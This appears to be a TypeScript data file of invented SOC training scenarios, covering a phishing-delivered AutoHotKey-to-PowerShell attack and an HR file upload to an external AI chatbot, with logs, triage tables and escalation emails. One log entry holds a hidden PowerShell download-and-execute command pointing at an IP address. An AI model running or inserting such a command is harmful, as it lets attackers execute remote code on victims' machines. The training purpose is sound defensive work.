import React from 'react';
import { Code, MessageSquare, User, Cloud, Zap, Mail } from 'lucide-react';

export interface LogEntry {
  title: string;
  content: Record<string, string | number | boolean>;
}

export interface WorkflowStep {
  title: string;
  content: string;
  table?: {
    headers: string[];
    rows: string[][];
  };
}

export interface ScenarioDetail {
  id: string;
  title: string;
  icon: React.ElementType;
  color: string;
  alert: {
    name: string;
    severity: 'High' | 'Critical' | 'Medium';
    client: string;
    source: string;
    endpoint: string;
    user: string;
    triggerTime: string;
  };
  background: string;
  correlatedLogs: LogEntry[];
  workflow: WorkflowStep[];
  escalationSubject: string;
  escalationBody: string;
  finalDocumentation: Record<string, string>;
}

export const socScenarios: ScenarioDetail[] = [
  {
    id: 'powershell-autohotkey',
    title: 'PowerShell Execution via AutoHotKey Macro on Finance Department Endpoint',
    icon: Code,
    color: 'text-green-500',
    alert: {
      name: 'Suspicious PowerShell Execution Triggered via User Interface Automation',
      severity: 'High',
      client: 'QuantumDelta Holdings',
      source: 'EDR (SentinelOne) + UEBA + Microsoft Defender Logs + SIEM',
      endpoint: 'FIN-LAPTOP-004',
      user: 'nurfarah.sulaiman@quantumdelta.com',
      triggerTime: '2025-06-13 11:44 GMT+8',
    },
    background: 'A finance executive’s laptop executed a PowerShell command that was triggered via an AutoHotKey script masquerading as a PDF reader macro. The script was delivered through a phishing email with a zipped attachment named Invoice_Q2-PDFReader.zip. The script used GUI automation to simulate keystrokes and mouse movements to launch PowerShell stealthily, evading traditional macro-blocking and script controls.',
    correlatedLogs: [
      {
        title: 'Log 1: EDR Alert – Unusual PowerShell Invocation Chain',
        content: {
          "timestamp": "2025-06-13T03:44:02Z",
          "host": "FIN-LAPTOP-004",
          "user": "nurfarah.sulaiman",
          "parentProcess": "autohotkey.exe",
          "childProcess": "powershell.exe",
          "commandLine": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.101.94.70/init.ps1')\"",
          "outcome": "Blocked (EDR Policy)",
          "detectionType": "Execution via GUI automation"
        }
      },
      {
        title: 'Log 2: UEBA Alert – Rare Process Chain',
        content: {
          "user": "nurfarah.sulaiman@quantumdelta.com",
          "anomalyScore": 89,
          "alertType": "Rare process chain: AutoHotKey -> PowerShell",
          "firstSeen": "Yes",
          "host": "FIN-LAPTOP-004"
        }
      },
      {
        title: 'Log 3: Email Gateway Log (Phishing Email)',
        content: {
          "emailSubject": "Invoice Q2 and VAT Summary",
          "sender": "finance.ap@onesteel-global.com",
          "attachmentName": "Invoice_Q2-PDF-Reader.zip",
          "sandboxResult": "Suspicious – .ahk script masquerading as invoice viewer",
          "deliveryStatus": "Delivered (no malware signature detected)"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: SOC L1 Triage',
        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was PowerShell executed from a non-standard source?', 'Yes', 'Invoked by autohotkey.exe instead of explorer.exe or cmd.exe'],
            ['Was the user intentionally executing a script?', 'Unlikely', 'Email attachment disguised as invoice viewer'],
            ['Was the PowerShell payload allowed to run?', 'Blocked', 'EDR prevented execution of payload from init.ps1'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for phishing analysis, user confirmation, and endpoint forensics'],
          ]
        }
      },
      {
        title: 'Step 2: SOC L2 Analysis',
        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was the AutoHotKey binary signed or trusted?', 'No', 'Dropped from ZIP, unsigned'],
            ['Was the script disguised as a PDF reader or viewer?', 'Yes', 'Pretended to launch PDF GUI, but executed macro'],
            ['Was the PowerShell script downloaded from a known malicious IP?', 'Yes', '185.101.94.70 listed in April 2025 IOC feeds'],
            ['Was there any user interaction (clicking/opening ZIP)?', 'Yes', 'Email logs confirm user opened ZIP and ran executable'],
            ['Any lateral movement from this endpoint?', 'No', 'No post-execution network or credential abuse logged'],
            ['Is the user a high-risk target (e.g., finance)?', 'Yes', 'Handles vendor invoices and e-banking activities'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Sophisticated phishing with GUI automation abuse', 'High Risk'],
            ['PowerShell used for potential remote payload', 'High Risk'],
            ['Targeted finance executive', 'High Risk'],
            ['Blocked before lateral movement, but user/system at risk', 'Contained but Critical'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Phishing Attack Using GUI Automation to Trigger PowerShell on Finance Endpoint',
    escalationBody: `Dear QuantumDelta IT Security Team,

We are escalating a phishing-based malware delivery attempt that used GUI automation scripting (AutoHotKey) to stealthily execute PowerShell on a finance department endpoint. The attempt was successfully blocked by EDR, but the delivery method represents a modern evasive technique bypassing traditional defences.

**Incident Summary**
• User: nurfarah.sulaiman@quantumdelta.com
• Endpoint: FIN-LAPTOP-004
• Time: 2025-06-13 11:44 GMT+8
• Script Trigger: AutoHotKey macro (Invoice_Q2-PDF-Reader.zip)
• Payload URL: http://185.101.94.70/init.ps1
• Malware Family: Likely AsyncRAT variant (based on signature match)
• Outcome: Blocked – No payload executed

**Risk Assessment**
• Macro executed via GUI automation to evade policy blocks
• Delivered through realistic finance-themed phishing lure
• High-value user targeted (invoice and banking role)
• Could have led to RAT deployment, credential theft, or data exfiltration

**Recommendations**
1. Immediately scan FIN-LAPTOP-004 for persistence mechanisms or residual scripts
2. Reset password for nurfarah.sulaiman and audit session tokens
3. Block IP 185.101.94.70 across perimeter and endpoint systems
4. Update email filters to block .ahk and disguised ZIP payloads
5. Educate finance team on evasion-based phishing techniques

Please confirm if MSSP should:
• Perform full memory forensics on endpoint
• Add .ahk signature detection in SIEM rules
• Launch targeted phishing simulation for finance department

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: QD-GUIAUTOMATION-0613-021`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-QD-202506131144",
      "Escalation ID": "QD-GUIAUTOMATION-0613-021",
      "Alert Category": "Endpoint Threat – GUI Macro Execution via AHK",
      "Escalated To": "QuantumDelta IR + Endpoint Ops",
      "Severity": "High",
      "Status": "Escalated – Awaiting scan + account reset",
      "Final Recommendation": "Phishing hardening + script filtering + IOC blocklist update",
    }
  },
  {
    id: 'genai-dlp',
    title: 'Generative AI Misuse – File Upload to Public Chatbot via Corporate Endpoint',
    icon: MessageSquare,
    color: 'text-purple-500',
    alert: {
      name: 'Confidential Data Posted to External AI Tool',
      severity: 'High',
      client: 'NovaEnergy Utilities Sdn Bhd',
      source: 'Endpoint DLP + DNS Logs + Browser Monitoring (via XDR & Proxy)',
      endpoint: 'HR-LAPTOP-07',
      user: 'suraya.amin@novaenergy.com',
      triggerTime: '2025-06-23 11:44 GMT+8',
    },
    background: 'MSSP deployed browser telemetry and DLP policies to monitor traffic to Generative AI endpoints like ChatGPT, Claude, Gemini and open-source front ends. Alert fired when confidential document data was uploaded to a known AI input form from a corporate endpoint.',
    correlatedLogs: [
      {
        title: 'Log 1: Endpoint Activity Log (XDR Agent)',
        content: {
          "timestamp": "2025-06-23T03:44:12Z",
          "hostname": "HR-LAPTOP-07",
          "user": "suraya.amin@novaenergy.com",
          "fileName": "Salary-Banding-Q3-Confidential.xlsx",
          "action": "Opened",
          "process": "excel.exe",
          "md5": "b64f9abcb812d94d337aa0b92e1905d2"
        }
      },
      {
        title: 'Log 2: Web Request (Browser Telemetry via Secure Proxy)',
        content: {
          "timestamp": "2025-06-23T03:44:27Z",
          "user": "suraya.amin@novaenergy.com",
          "url": "https://aiassist.chat.openmodelai.org",
          "method": "POST",
          "uploadedContent": "salary banding table",
          "sourceDevice": "HR-LAPTOP-07",
          "browser": "Edge 119.0",
          "contentType": "application/vnd.ms-excel",
          "documentHash": "b64f9abcb812d94d337aa0b92e1905d2"
        }
      },
      {
        title: 'Log 3: DNS + Threat Intelligence Enrichment',
        content: {
          "dnsQuery": "aiassist.chat.openmodelai.org",
          "threatCategory": "Generative AI - Unauthorised",
          "reputation": "Monitored – Custom Policy Violation",
          "matchedPolicy": "No AI Upload for HR Documents"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: Validate Alert – L1 Analyst',
        content: 'The L1 analyst confirms the DLP violation and verifies the file hash match between the endpoint activity and the web request.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Is this a valid DLP policy violation?', 'Yes', 'Match on sensitive HR data file with corporate classification tag'],
            ['Was the file hash matched to actual upload?', 'Yes', 'Same hash from XDR and upload logs'],
            ['Was the user operating on corporate device, not BYOD?', 'Yes', 'Device: HR-LAPTOP-07 (in asset inventory)'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for deeper analysis'],
          ]
        }
      },
      {
        title: 'Step 2: L2 Analysis – Contextual Behaviour Review',
        content: 'The L2 analyst reviews the context of the file and the destination to assess the risk and intentionality.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was the file classified as confidential internally?', 'Yes', 'Tag: HR - Internal Only'],
            ['Was the destination listed under restricted AI tools?', 'Yes', 'Listed in DLP Policy #AIBlock-002'],
            ['Was the user warned or prompted before upload?', 'No', 'No blocking control triggered'],
            ['Was this action intentional or accidental (based on behaviour)?', 'Unknown', 'Needs user confirmation'],
            ['Has this user triggered similar events before?', 'No', 'First offence'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sensitivity of the data and compliance risks.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Clear DLP violation', 'High Risk'],
            ['Upload of sensitive HR document to unauthorised Generative AI site', 'High Risk'],
            ['Could result in unintentional data leakage or ingestion into AI model', 'High Risk'],
            ['Potential breach of PDPA and internal data handling policies', 'Compliance Risk'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Confidential HR Data Uploaded to Public AI Tool – User suraya.amin@novaenergy.com',
    escalationBody: `Dear NovaEnergy SOC Team,

This is to inform you that our monitoring tools have detected a Data Loss Prevention (DLP) violation involving confidential HR data and the use of an external Generative AI platform. The incident details are as follows:

**Incident Summary**
• User: suraya.amin@novaenergy.com
• Device: HR-LAPTOP-07
• File Involved: Salary-Banding-Q3-Confidential.xlsx
• Destination Site: https://aiassist.chat.openmodelai.org
• Action: File data submitted via POST request
• Time: 2025-06-23 11:44 GMT+8

**Risk Summary**
• The file is tagged as Confidential – Internal Use Only and contains salary banding data for Q3.
• The destination platform is not sanctioned by NovaEnergy and is listed under the prohibited GenAI endpoint category.
• The upload was performed from a corporate-managed device using a secure browser, indicating possible unintentional data exposure or tool misuse.

**Recommendations**
1. Immediately engage the user for clarification (was it intentional or testing-related?).
2. Restrict access to AI-related endpoints temporarily for user or department.
3. Review and enhance AI usage policy enforcement through SOAR or inline proxy control.
4. Classify incident under “Policy Violation – External Data Disclosure” and assess whether notification to PDPA compliance team is required.

**Supporting Artifacts**
• XDR file access log (Excel opened with MD5 hash)
• Web telemetry: POST to AI chatbot with document hash match
• DNS categorisation confirming unsanctioned endpoint
• Policy reference: AI-Block-002, DLP-Browser-Rule-11

Please confirm if you would like us to:
• Quarantine the device for further forensic review
• Block the user temporarily from accessing corporate tools
• Include this in monthly compliance violation reporting

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: NOVA-GENAI-0623-002`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-NOVA-202506231144",
      "Escalation ID": "NOVA-GENAI-0623-002",
      "Alert Category": "DLP + GenAI Tool Use",
      "Escalated To": "NovaEnergy SOC / HR Security Officer",
      "Severity": "High",
      "Status": "Escalated – Pending Client Response",
      "Follow-Up Time": "3 hours",
      "Final Recommendation": "User review, policy reinforcement, block AI POST",
    }
  },
  // Placeholder scenarios
  { id: 'credential-stuffing', title: 'Credential Stuffing on API', icon: User, color: 'text-red-500', alert: { name: 'API Brute Force', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'insider-cloud-deletion', title: 'Insider Threat (Cloud File Deletion)', icon: Cloud, color: 'text-orange-500', alert: { name: 'Mass File Deletion', severity: 'Critical', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'service-account-powershell', title: 'Service Account PowerShell Execution', icon: Code, color: 'text-green-500', alert: { name: 'Service Account Anomaly', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'cloud-misconfig-s3', title: 'Cloud Misconfiguration (S3 Exposure)', icon: Cloud, color: 'text-blue-500', alert: { name: 'Public Bucket Detected', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'lateral-movement-psexec', title: 'Lateral Movement via PsExec', icon: Zap, color: 'text-red-500', alert: { name: 'PsExec Usage', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'mfa-push-fatigue', title: 'MFA Push Fatigue Attack', icon: User, color: 'text-orange-500', alert: { name: 'MFA Failure Spike', severity: 'Medium', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'ransomware-note', title: 'Ransomware Note on Shared Drive', icon: Zap, color: 'text-red-500', alert: { name: 'Ransomware Behavior', severity: 'Critical', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'prompt-injection', title: 'Prompt Injection in Internal Chatbot', icon: MessageSquare, color: 'text-purple-500', alert: { name: 'LLM Abuse', severity: 'Medium', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'shadow-it-git', title: 'Shadow IT Git Access (Stolen SSH Key)', icon: Code, color: 'text-blue-500', alert: { name: 'Unauthorized Git Access', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'oauth-abuse', title: 'OAuth Abuse for Mail Exfiltration', icon: Mail, color: 'text-orange-500', alert: { name: 'Mailbox Rule Creation', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
];